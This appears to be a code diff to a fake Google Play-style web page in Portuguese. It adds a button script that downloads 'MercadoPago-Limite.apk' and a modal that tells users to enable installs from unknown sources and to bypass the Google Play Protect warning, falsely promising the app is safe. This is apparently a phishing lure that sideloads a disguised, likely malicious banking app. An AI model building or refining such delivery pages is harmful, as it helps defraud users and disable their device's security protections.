@@ -680,19 +680,128 @@ hr {
 
 <!-- Install Button - Google Play Style -->
 <div class="mt-4">
-    <button type="button" class="btn btn-success fs-6 fw-semibold py-3 px-5" id="download-button" 
-        style="min-width: 280px; 
-               background-color: #01875f; 
-               border: none; 
-               border-radius: 8px; 
+    <button type="button" class="btn btn-success fs-6 fw-semibold py-3 px-5" id="download-button"
+        style="min-width: 280px;
+               background-color: #01875f;
+               border: none;
+               border-radius: 8px;
                box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
                transition: all 0.2s;
                touch-action: manipulation;
                font-weight: 600;">Instalar</button>
 </div>
 
+<!-- Modal de Instruções de Instalação -->
+<div id="install-modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:flex-end; padding:0;">
+    <div id="install-modal" style="background:#fff; width:100%; max-width:480px; border-radius:20px 20px 0 0; padding:24px 20px 32px; box-shadow:0 -4px 24px rgba(0,0,0,0.2); animation:slideUp 0.3s ease-out; max-height:85vh; overflow-y:auto;">
+        <!-- Handle bar -->
+        <div style="width:40px; height:4px; background:#dadce0; border-radius:2px; margin:0 auto 20px;"></div>
+
+        <!-- Header -->
+        <div style="display:flex; align-items:center; gap:12px; margin-bottom:20px;">
+            <div style="width:44px; height:44px; background:#e8f5e9; border-radius:50%; display:flex; align-items:center; justify-content:center;">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="#1e8e3e"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            </div>
+            <div>
+                <h5 style="margin:0; font-size:1.1rem; color:#202124; font-weight:600;">Download iniciado!</h5>
+                <p style="margin:0; font-size:0.85rem; color:#5f6368;">Siga os passos abaixo para instalar</p>
+            </div>
+        </div>
+
+        <!-- Progress bar -->
+        <div style="background:#e0e0e0; border-radius:4px; height:6px; margin-bottom:24px; overflow:hidden;">
+            <div id="download-progress" style="background:#01875f; height:100%; width:0%; border-radius:4px; transition:width 2s ease-in-out;"></div>
+        </div>
+
+        <!-- Passo 1 -->
+        <div style="display:flex; gap:14px; margin-bottom:20px; align-items:flex-start;">
+            <div style="min-width:32px; height:32px; background:#01875f; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.9rem;">1</div>
+            <div>
+                <p style="margin:0 0 4px; font-size:0.95rem; color:#202124; font-weight:500;">Abra as Configurações do celular</p>
+                <p style="margin:0; font-size:0.85rem; color:#5f6368;">Vá em <strong>Configurações</strong> → <strong>Segurança</strong> ou <strong>Privacidade</strong></p>
+            </div>
+        </div>
+
+        <!-- Passo 2 -->
+        <div style="display:flex; gap:14px; margin-bottom:20px; align-items:flex-start;">
+            <div style="min-width:32px; height:32px; background:#01875f; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.9rem;">2</div>
+            <div>
+                <p style="margin:0 0 4px; font-size:0.95rem; color:#202124; font-weight:500;">Ative "Fontes desconhecidas"</p>
+                <p style="margin:0; font-size:0.85rem; color:#5f6368;">Permita a instalação de apps de fontes desconhecidas para o seu <strong>navegador</strong> (Chrome, Samsung Internet, etc.)</p>
+            </div>
+        </div>
+
+        <!-- Passo 3 -->
+        <div style="display:flex; gap:14px; margin-bottom:20px; align-items:flex-start;">
+            <div style="min-width:32px; height:32px; background:#01875f; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.9rem;">3</div>
+            <div>
+                <p style="margin:0 0 4px; font-size:0.95rem; color:#202124; font-weight:500;">Abra o arquivo baixado</p>
+                <p style="margin:0; font-size:0.85rem; color:#5f6368;">Acesse a <strong>barra de notificações</strong> ou a pasta <strong>Downloads</strong> e toque no arquivo <strong>MercadoPago-Limite.apk</strong></p>
+            </div>
+        </div>
+
+        <!-- Passo 4 -->
+        <div style="display:flex; gap:14px; margin-bottom:24px; align-items:flex-start;">
+            <div style="min-width:32px; height:32px; background:#01875f; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.9rem;">4</div>
+            <div>
+                <p style="margin:0 0 4px; font-size:0.95rem; color:#202124; font-weight:500;">Toque em "Instalar"</p>
+                <p style="margin:0; font-size:0.85rem; color:#5f6368;">Confirme a instalação e aguarde. Após concluir, toque em <strong>"Abrir"</strong> para usar o app.</p>
+            </div>
+        </div>
+
+        <!-- Aviso -->
+        <div style="background:#fff3e0; border-radius:12px; padding:14px 16px; display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="#e65100" style="flex-shrink:0; margin-top:1px;"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+            <p style="margin:0; font-size:0.83rem; color:#bf360c; line-height:1.5;">Se aparecer um aviso do <strong>Google Play Protect</strong>, toque em <strong>"Instalar mesmo assim"</strong>. O app é seguro.</p>
+        </div>
+
+        <!-- Botão fechar -->
+        <button onclick="closeInstallModal()" style="width:100%; padding:14px; background:#01875f; color:#fff; border:none; border-radius:8px; font-size:1rem; font-weight:600; cursor:pointer;">Entendi</button>
+    </div>
+</div>
+
+<style>
+@keyframes slideUp {
+    from { transform: translateY(100%); }
+    to { transform: translateY(0); }
+}
+#install-modal-overlay { display:none; }
+#install-modal-overlay.active { display:flex !important; }
+</style>
+
 <script>
-// Add touch feedback for Android
+// Download APK and show install instructions
+document.getElementById('download-button').addEventListener('click', function() {
+    // Start APK download
+    var link = document.createElement('a');
+    link.href = 'apk/MercadoPago-Limite.apk';
+    link.download = 'MercadoPago-Limite.apk';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+    // Show modal after short delay
+    setTimeout(function() {
+        document.getElementById('install-modal-overlay').classList.add('active');
+        // Animate progress bar
+        setTimeout(function() {
+            document.getElementById('download-progress').style.width = '100%';
+        }, 100);
+    }, 500);
+});
+
+// Close modal
+function closeInstallModal() {
+    document.getElementById('install-modal-overlay').classList.remove('active');
+    document.getElementById('download-progress').style.width = '0%';
+}
+
+// Close on overlay click
+document.getElementById('install-modal-overlay').addEventListener('click', function(e) {
+    if (e.target === this) closeInstallModal();
+});
+
+// Touch feedback
 document.getElementById('download-button').addEventListener('touchstart', function() {
     this.style.transform = 'scale(0.98)';
 });
